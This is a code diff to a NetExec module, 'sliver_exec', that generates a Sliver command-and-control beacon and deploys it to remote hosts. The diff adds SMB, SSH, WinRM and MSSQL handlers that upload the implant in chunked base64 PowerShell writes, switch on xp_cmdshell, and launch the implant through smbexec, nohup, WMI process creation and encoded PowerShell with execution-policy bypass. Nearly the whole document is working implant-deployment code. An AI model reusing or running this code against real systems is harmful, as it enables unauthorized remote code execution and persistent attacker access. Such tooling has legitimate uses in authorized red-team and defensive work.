@@ -8,6 +8,8 @@ import string
 import threading
 import queue
 import logging
+import base64
+from abc import ABC, abstractmethod
 from nxc.helpers.misc import CATEGORY
 
 try:
@@ -123,19 +125,305 @@ class GrpcWorker:
         self.thread.join(timeout=5.0)
 
 
+class ProtocolHandler(ABC):
+    def __init__(self, module):
+        self.module = module  # Access to shared NXCModule state
+
+    def _chunked_upload(self, context, connection, local_path, full_remote_path, exec_ps_cmd, chunk_size=1024 * 2):
+        """
+        ... (existing doc)
+        chunk_size: Raw bytes per chunk (default 2KB; override per-protocol).
+        """
+        # Read and encode the file to base64
+        with open(local_path, 'rb') as f:
+            file_data = f.read()
+
+        b64_data = base64.b64encode(file_data).decode('ascii')
+
+        # Split into chunks of specified size
+        chunks = []
+        for i in range(0, len(b64_data), chunk_size):
+            chunks.append(b64_data[i:i + chunk_size])
+
+        context.log.display(f"Uploading file in {len(chunks)} chunks")
+
+        # Create temporary file on target
+        temp_file = f"{full_remote_path}.b64"
+        ps_cmd = f'''
+try {{
+    New-Item -Path '{temp_file}' -ItemType File -Force | Out-Null
+    Write-Host "Temp file created"
+}} catch {{
+    Write-Host "Error creating temp file: $_"
+}}
+'''
+        result = exec_ps_cmd(ps_cmd)
+        if result and result.strip():
+            context.log.info(f"PowerShell output: {result[:500]}{'...' if len(result) > 500 else ''}")
+
+        # Upload each chunk
+        for i, chunk in enumerate(chunks):
+            context.log.debug(f"Uploading chunk {i + 1}/{len(chunks)}")
+            ps_cmd = f'''
+try {{
+    $chunk = @"
+{chunk}
+"@
+    Add-Content -Path '{temp_file}' -Value $chunk -NoNewline
+    Write-Host "Chunk {i + 1} added"
+}} catch {{
+    Write-Host "Error adding chunk {i + 1}: $_"
+}}
+'''
+            result = exec_ps_cmd(ps_cmd)
+            if result and result.strip():
+                context.log.info(f"PowerShell output: {result[:500]}{'...' if len(result) > 500 else ''}")
+
+        # Decode and save the final file
+        ps_cmd = f'''
+try {{
+    $base64 = Get-Content -Path '{temp_file}' -Raw
+    $bytes = [Convert]::FromBase64String($base64)
+    [IO.File]::WriteAllBytes('{full_remote_path}', $bytes)
+    Remove-Item -Path '{temp_file}' -Force
+    Write-Host "File decoded and saved"
+}} catch {{
+    Write-Host "Error decoding/saving: $_"
+}}
+'''
+        result = exec_ps_cmd(ps_cmd)
+        if result and result.strip():
+            context.log.info(f"PowerShell output: {result[:500]}{'...' if len(result) > 500 else ''}")
+
+    @abstractmethod
+    def get_remote_paths(self, os_type, implant_name):
+        """
+        Return (full_remote_path: str, share: str|None).
+        full_remote_path: Exec path on target (e.g., 'C:\\Windows\\Temp\\implant.exe').
+        share: For SMB; None for others.
+        """
+        pass
+
+    @abstractmethod
+    def upload(self, context, connection, local_path, full_remote_path):
+        """Upload local_path to full_remote_path. Raise on failure."""
+        pass
+
+    @abstractmethod
+    def execute(self, context, connection, full_remote_path, os_type):
+        """Execute the implant at full_remote_path. Log success/warn."""
+        pass
+
+    @abstractmethod
+    def get_cleanup_cmd(self, full_remote_path, os_type):
+        """Return shell cmd str to delete the file (e.g., 'del /f ...')."""
+        pass
+
+
+class SMBHandler(ProtocolHandler):
+    def get_remote_paths(self, os_type, implant_name):
+        if os_type == "windows":
+            full_path = f"C:\\Windows\\Temp\\{implant_name}"
+            share = self.module.share_config or "ADMIN$"
+        else:  # Linux via Samba
+            full_path = f"/tmp/{implant_name}"
+            share = self.module.share_config or "IPC$"
+        return full_path, share
+
+    def upload(self, context, connection, local_path, full_remote_path):
+        os_type = self.module.os_type
+        share = self.module.share_config
+        if os_type == "windows":
+            if full_remote_path.lower().startswith("c:\\"):
+                smb_path = "\\" + full_remote_path[3:]
+            else:
+                smb_path = full_remote_path.replace("/", "\\")
+        else:
+            smb_path = os.path.basename(full_remote_path)
+        remote_dir = smb_path.rsplit("\\", 1)[0] if "\\" in smb_path else smb_path.rsplit("/", 1)[0]
+        if remote_dir and remote_dir != "":
+            if os_type == "windows":
+                mkdir_cmd = f'mkdir "{remote_dir}" 2>nul'
+                try:
+                    connection.execute(mkdir_cmd, methods=["smbexec"])
+                except Exception as mk_e:
+                    context.log.debug(f"Mkdir skipped (exec fail): {mk_e}")
+            else:
+                context.log.debug("Skipping remote mkdir via smbexec on Linux target; will upload file directly")
+        connection.conn.reconnect()
+        connection.conn.putFile(share, smb_path, open(local_path, "rb").read)
+        context.log.success("SMB upload complete")
+
+    def execute(self, context, connection, full_remote_path, os_type):
+        method = "smbexec"
+        if os_type == "windows":
+            cmd = f'cmd /c "{full_remote_path}"'
+        else:
+            cmd = f"./{os.path.basename(full_remote_path)}"
+        try:
+            connection.execute(cmd, methods=[method])
+            context.log.info(f"Executed via SMB: {full_remote_path}")
+        except Exception as e:
+            context.log.warning(f"SMB exec failed: {e}")
+
+    def get_cleanup_cmd(self, full_remote_path, os_type):
+        return f'del /f /q "{full_remote_path}"' if os_type == "windows" else f'rm -f "{full_remote_path}"'
+
+
+class SSHHandler(ProtocolHandler):
+    def get_remote_paths(self, os_type, implant_name):
+        if os_type != "linux":
+            raise ValueError("SSH handler assumes Linux target")
+        return f"/tmp/{implant_name}", None
+
+    def upload(self, context, connection, local_path, full_remote_path):
+        try:
+            sftp = connection.conn.open_sftp()
+            sftp.put(local_path, full_remote_path)
+            sftp.close()
+            connection.execute(f"chmod +x '{full_remote_path}'")
+            context.log.success("SSH upload complete")
+        except Exception as e:
+            context.log.fail(f"SSH upload failed: {e}")
+            raise
+
+    def execute(self, context, connection, full_remote_path, os_type):
+        cmd = f"nohup {full_remote_path} >/dev/null 2>&1 &"
+        try:
+            connection.execute(cmd)
+            context.log.info(f"Executed via SSH: {full_remote_path}")
+        except Exception as e:
+            context.log.warning(f"SSH exec failed: {e}")
+
+    def get_cleanup_cmd(self, full_remote_path, os_type):
+        return f"rm -f '{full_remote_path}'"
+
+
+class WinRMHandler(ProtocolHandler):
+    def get_remote_paths(self, os_type, implant_name):
+        if os_type != "windows":
+            raise ValueError("WinRM handler assumes Windows target")
+        return f"C:\\Windows\\Temp\\{implant_name}", None
+
+    def upload(self, context, connection, local_path, full_remote_path):
+        def exec_ps_cmd(ps_cmd):
+            return connection.ps_execute(ps_cmd, get_output=True)
+
+        try:
+            # WinRM's default max envelope size is 150KB
+            self._chunked_upload(context, connection, local_path, full_remote_path, exec_ps_cmd, chunk_size=1024 * 50)
+            context.log.success("WinRM upload complete (via chunked base64)")
+        except Exception as e:
+            context.log.fail(f"WinRM upload failed: {e}")
+            raise
+
+    def execute(self, context, connection, full_remote_path, os_type):
+        ps_cmd = f'(Get-WmiObject -Class Win32_Process -List).Create("{full_remote_path}") | Out-Null'
+        try:
+            result = connection.ps_execute(ps_cmd, get_output=True)
+            if result and result.strip():
+                context.log.debug(f"PowerShell output: {result}")
+            context.log.info(f"Executed via WinRM: {full_remote_path}")
+        except Exception as e:
+            context.log.warning(f"WinRM exec failed: {e}")
+
+    def get_cleanup_cmd(self, full_remote_path, os_type):
+        return f"Remove-Item -Force '{full_remote_path}'"
+
+
+class MSSQLHandler(ProtocolHandler):
+    def get_remote_paths(self, os_type, implant_name):
+        if os_type != "windows":
+            raise ValueError("MSSQL handler assumes Windows target")
+        return f"C:\\Users\\Public\\{implant_name}", None
+
+    def upload(self, context, connection, local_path, full_remote_path):
+        import base64
+
+        def query_option_state(option):
+            """Direct SQL query for option state (0/1)."""
+            try:
+                result = connection.sql_query(f"SELECT value FROM sys.configurations WHERE name='{option}'")
+                return result[0]['value'] if result else 0
+            except Exception as e:
+                context.log.warning(f"Failed to query {option} state: {e}")
+                return 0
+
+        def set_option(option, enabled):
+            """Direct sp_configure + RECONFIGURE."""
+            try:
+                sql = f"EXEC sp_configure '{option}', {enabled}; RECONFIGURE;"
+                connection.conn.sql_query(sql)
+                context.log.debug(f"{option} set to {enabled}")
+            except Exception as e:
+                context.log.fail(f"Failed to set {option}={enabled}: {e}")
+                raise
+
+        # Step 1: Backup original states
+        adv_orig = query_option_state('show advanced options')
+        xp_orig = query_option_state('xp_cmdshell')
+        context.log.debug(f"Original: advanced={adv_orig}, xp_cmdshell={xp_orig}")
+
+        # Step 2: Enable xp_cmdshell
+        if adv_orig == 0:
+            set_option('show advanced options', 1)
+        if xp_orig == 0:
+            set_option('xp_cmdshell', 1)
+
+        # Run chunked upload (mssqlexec skips toggle since enabled)
+        def exec_ps_cmd(ps_cmd):
+            import base64
+            encoded_script = base64.b64encode(ps_cmd.encode('utf-16-le')).decode('ascii')
+            shell_cmd = f'powershell -ExecutionPolicy Bypass -EncodedCommand {encoded_script}'
+            return connection.execute(shell_cmd)
+
+        try:
+            # Chunk size tuned for MSSQL xp_cmdshell command length limits
+            self._chunked_upload(context, connection, local_path, full_remote_path, exec_ps_cmd, chunk_size=1800)
+            context.log.success("MSSQL upload complete (chunked base64 via xp_cmdshell)")
+        finally:
+            # Restore originals
+            if adv_orig == 0:
+                set_option('show advanced options', 0)
+            if xp_orig == 0:
+                set_option('xp_cmdshell', 0)
+            context.log.debug("Restored original option states")
+
+    def execute(self, context, connection, full_remote_path, os_type):
+        import base64
+        wmi_ps = f'(Get-WmiObject -Class Win32_Process -List).Create("{full_remote_path}") | Out-Null'
+        encoded_script = base64.b64encode(wmi_ps.encode('utf-16-le')).decode('ascii')
+        shell_cmd = f'powershell -ExecutionPolicy Bypass -EncodedCommand {encoded_script}'
+        try:
+            connection.execute(shell_cmd)
+            context.log.info(f"Executed via MSSQL (WMI): {full_remote_path}")
+        except Exception as e:
+            context.log.warning(f"MSSQL exec failed: {e}")
+
+    def get_cleanup_cmd(self, full_remote_path, os_type):
+        return f"del /f /q \"{full_remote_path}\""
+
+
 class NXCModule:
     """
-    NetExec module for generating and executing unique Sliver beacons on remote targets via SMB.
+    NetExec module for generating and executing unique Sliver beacons on remote targets via multiple protocols.
     """
     name = "sliver_exec"
     description = "Generates unique Sliver beacon and executes on target"
-    supported_protocols = ["smb"]
+    supported_protocols = ["smb", "ssh", "winrm", "mssql"]
     opsec_safe = False
     multiple_hosts = False
     category = CATEGORY.PRIVILEGE_ESCALATION
 
     # Single shared worker for all instances (fixes multi-thread gRPC poller races)
     _shared_worker = None
+
+    priv_levels = {
+        "smb": "HIGH",
+        "mssql": "HIGH",
+        "ssh": "LOW",
+        "winrm": "LOW"
+    }
 
     @classmethod
     def _get_shared_worker(cls):
@@ -174,9 +462,7 @@ class NXCModule:
         self.config_path = None
         self.profile = None
         # Runtime state
-        self.full_path = None
-        self.share = None
-        self.smb_path = None
+        self.local_implant_path = None
 
     def options(self, context, module_options):
         """
@@ -253,7 +539,7 @@ class NXCModule:
         self.cleanup = module_options.get("CLEANUP", "True").lower() in ("true", "1", "yes")
         self.os_type = module_options.get("OS", None)
         self.arch = module_options.get("ARCH", None)
-        self.share_config = module_options.get("SHARE", None)
+        self.share_config = module_options.get("SHARE", None)  # Optional, used by SMB
         self.wait_seconds = int(module_options.get("WAIT", "90"))
         # PROFILE mode
         self.profile = module_options.get("PROFILE", None)
@@ -354,18 +640,42 @@ class NXCModule:
             raise ValueError("Failed to start default mTLS listener")
         return default_listener
 
-    def on_admin_login(self, context, connection):
-        """
-        Main module execution entry point.
-        Called by NetExec on admin login.
-        """
-        pass
+    def get_handler(self, protocol):
+        handlers = {
+            "smb": SMBHandler(self),
+            "ssh": SSHHandler(self),
+            "winrm": WinRMHandler(self),
+            "mssql": MSSQLHandler(self),
+        }
+        handler = handlers.get(protocol)
+        if not handler:
+            raise ValueError(f"Unsupported protocol: {protocol}")
+        return handler
+
+    def _get_exec_method(self, protocol):
+        return {
+            "smb": "smbexec",
+            "ssh": "ssh",
+            "winrm": "winrm",
+            "mssql": "mssql"
+        }[protocol]
 
     def on_login(self, context, connection):
         """
-        Alternative entry point for regular login.
+        Runs on all logins; handles priv checks and dedup.
         """
+        protocol = connection.__class__.__name__.lower()
+        high_priv_protocols = {"smb", "mssql"}
+
+        if protocol in high_priv_protocols and not connection.has_admin():
+            context.log.warning(f"Low-priv login on {protocol}; skipping (requires admin).")
+            return
+
         self._run_beacon(context, connection)
+
+    # Make module show as high privilege
+    def on_admin_login(self, context, connection):
+        pass
 
     def _run_beacon(self, context, connection):
         """
@@ -373,7 +683,7 @@ class NXCModule:
         1. Detect OS/arch
         2. Generate unique implant name
         3. Generate Sliver beacon
-        4. Upload to target via SMB
+        4. Upload to target via protocol handler
         5. Execute
         6. Wait & cleanup
         """
@@ -384,21 +694,22 @@ class NXCModule:
         tmp_path = self._save_implant_to_temp(implant_data)
         self.local_implant_path = tmp_path
 
-        try:
-            remote_path, share, smb_path = self._determine_remote_paths(os_type, implant_name)
-            self.remote_implant_path = remote_path
-            self.remote_share = share
-            self.smb_path = smb_path
-            self._increase_smb_timeout(connection)
-            if not self._upload_implant_via_smbexec(context, connection, tmp_path, remote_path, share, os_type):
-                sys.exit(1)
-            context.log.info(f"Uploaded to \\\\{host}\\{share}\\{implant_name}")
-            self._execute_implant(context, connection, remote_path, os_type)
+        # Extract protocol from connection object's class name (e.g., 'winrm' -> 'winrm')
+        protocol = connection.__class__.__name__.lower()
+        handler = self.get_handler(protocol)
 
-            if self.cleanup:
-                self._wait_and_cleanup(context, connection, remote_path, os_type, implant_name)
-            else:
-                context.log.info("Cleanup skipped (CLEANUP=False)")
+        try:
+            full_remote_path, share = handler.get_remote_paths(os_type, implant_name)
+            self.full_path = full_remote_path
+            if share:
+                self.share = share
+            context.log.display(f"Starting upload to {host} via {protocol}...")
+            handler.upload(context, connection, tmp_path, full_remote_path)
+            context.log.info(f"Uploaded to {host} via {protocol}")
+            context.log.display(f"Executing beacon at {full_remote_path}...")
+            handler.execute(context, connection, full_remote_path, os_type)
+
+            self._wait_for_beacon_and_cleanup(context, connection, full_remote_path, os_type, implant_name, handler, protocol, cleanup=self.cleanup)
 
         finally:
             self._cleanup_local_temp(tmp_path)
@@ -418,9 +729,11 @@ class NXCModule:
         if self.profile:
             context.log.display(f"Profile '{self.profile}' overrides detected OS/arch for generation.")
 
+        # Get OS info for both OS and arch detection
+        os_info = getattr(connection, "server_os", None)
+
         # Detect OS if not specified
         if os_type is None:
-            os_info = getattr(connection, "server_os", None)
             if not os_info:
                 context.log.fail("Could not detect OS. Use -o OS=windows|linux")
                 sys.exit(1)
@@ -444,11 +757,16 @@ class NXCModule:
                 elif any(x in os_info_lower for x in ["x86", "32-bit"]):
                     arch_info = "386"
 
-            if arch_info is None:
+            if not arch_info:
                 arch = "amd64"  # Default to x64 when architecture cannot be detected
             else:
                 arch_info_lower = str(arch_info).lower()
-                arch = "amd64" if any(x in arch_info_lower for x in ("64", "x86_64", "amd64")) else "386"
+                if any(x in arch_info_lower for x in ("64", "x86_64", "amd64")):
+                    arch = "amd64"
+                elif any(x in arch_info_lower for x in ("x86", "32-bit", "i386", "i686")):
+                    arch = "386"
+                else:
+                    arch = "amd64"  # Default to x64 for unknown architectures
             context.log.debug(f"Detected arch: {arch}")
         else:
             context.log.display(f"Using specified arch: {arch}")
@@ -600,107 +918,34 @@ class NXCModule:
         tmp_file.close()
         return tmp_file.name
 
-    def _determine_remote_paths(self, os_type, implant_name):
+    def _wait_for_beacon_and_cleanup(self, context, connection, full_remote_path, os_type, implant_name, handler, protocol, cleanup=True):
         """
-        Determine full path, SMB-relative path, and share for target.
-        Windows: C:\\Windows\\Temp\\file.exe → ADMIN$\\Windows\\Temp\\file.exe
-        Linux: share_root/implant_xxx.exe (using "linux" share by default)
-        Returns (full_path, share, smb_path)
-        """
-        if os_type == "windows":
-            full_path = f"C:\\Windows\\Temp\\{implant_name}"
-            smb_path = f"Windows\\Temp\\{implant_name}"
-            share = self.share_config or "ADMIN$"
-        else:
-            full_path = f"/linux_share_root/{implant_name}"  # For logging/exec;
-            smb_path = implant_name  # Relative to share root
-            share = self.share_config or "linux"
-        return full_path, share, smb_path
-
-    def _increase_smb_timeout(self, connection):
-        """
-        Set SMB connection timeout to 300s (5 min) for large uploads.
-        """
-        connection.conn.setTimeout(300)
-
-    def _upload_implant_via_smbexec(self, context, connection, local_path, remote_path, share, os_type):
-        """
-        Direct upload. Uses correct SMB-relative path.
-        """
-        context.log.info("Uploading implant directly via SMB (putFile)...")
-
-        if os_type == "windows":
-            # Remove leading C:\Windows\ (case-insensitive) to get SMB-relative path.
-            if remote_path.lower().startswith("c:\\windows\\"):
-                smb_path = "\\" + remote_path[len("C:\\Windows\\"):]
-            else:
-                smb_path = remote_path
-        else:
-            smb_path = self.smb_path
-
-        remote_dir = smb_path.rsplit("\\", 1)[0] if "\\" in smb_path else smb_path.rsplit("/", 1)[0]
-
-        try:
-            if remote_dir and remote_dir != "":  # Skip mkdir for root/empty dir
-                # Only attempt remote mkdir via smbexec on Windows targets. For Linux targets skip mkdir.
-                if os_type == "windows":
-                    mkdir_cmd = f'mkdir "{remote_dir}" 2>nul'
-                    try:
-                        connection.execute(mkdir_cmd, methods=["smbexec"])
-                    except Exception as mk_e:
-                        context.log.debug(f"Mkdir skipped (exec fail): {mk_e}")
-                else:
-                    context.log.debug("Skipping remote mkdir via smbexec on Linux target; will upload file directly")
-
-            # Refresh connection to handle stale NETBIOS sessions, especially on Linux/Samba hosts
-            # which can drop connections during multi-target parallelism + proxychains latency
-            connection.conn.reconnect()
-            # Upload implant
-            connection.conn.putFile(share, smb_path, open(local_path, "rb").read)
-            context.log.success("Implant SMB upload complete")
-            return True
-        except Exception as e:
-            context.log.fail(f"Direct upload failed: {e}")
-            return False
-
-    def _execute_implant(self, context, connection, remote_path, os_type):
-        """
-        Execute EXE implant directly (EXECUTABLE only).
-        """
-        context.log.debug("Executing implant...")
-        # SMB execute is only supported on Windows targets in this module.
-        if os_type != "windows":
-            context.log.fail("SMB execute is not supported on Linux targets; skipping remote execution")
-            return False
-
-        exec_cmd = f'cmd /c "{remote_path}"'
-        try:
-            connection.execute(exec_cmd, methods=["smbexec"])
-            context.log.info(f"Executed: {remote_path}")
-            return True
-        except Exception as e:
-            context.log.warning(f"Execution failed: {e}")
-            return False
-
-    def _wait_and_cleanup(self, context, connection, remote_path, os_type, implant_name):
-        """
-        Wait for beacon via Sliver polling, then cleanup.
+        Wait for beacon via Sliver polling, then optionally cleanup using handler cmd.
         Falls back to timeout if polling fails.
         """
 
-        if os_type != "windows":
-            return False
-
         if not self._wait_for_beacon(context, implant_name, timeout=self.wait_seconds):
-            context.log.display("Beacon not detected within timeout — cleaning up anyway")
+            if cleanup:
+                context.log.display("Beacon not detected within timeout — cleaning up anyway")
+            else:
+                context.log.display("Beacon not detected within timeout")
 
-        # Always cleanup remote file
-        cleanup_cmd = f'del /f /q "{remote_path}"' if os_type == "windows" else f'rm -f "{remote_path}"'
-        try:
-            connection.execute(cleanup_cmd, methods=["smbexec"])
-            context.log.info("Cleaned up remote implant")
-        except Exception as e:
-            context.log.warning(f"Cleanup failed: {e}")
+        if cleanup:
+            # Cleanup remote file
+            cleanup_cmd = handler.get_cleanup_cmd(full_remote_path, os_type)
+            method = self._get_exec_method(protocol)
+            try:
+                if protocol == "winrm":
+                    result = connection.ps_execute(cleanup_cmd, get_output=True)
+                    if result and result.strip():
+                        context.log.debug(f"PowerShell cleanup output: {result}")
+                else:
+                    connection.execute(cleanup_cmd, methods=[method])
+                context.log.info("Cleaned up remote implant")
+            except Exception as e:
+                context.log.warning(f"Cleanup failed: {e}")
+        else:
+            context.log.info("Cleanup skipped (CLEANUP=False)")
 
     def _wait_for_beacon(self, context, implant_name, timeout=30):
         """
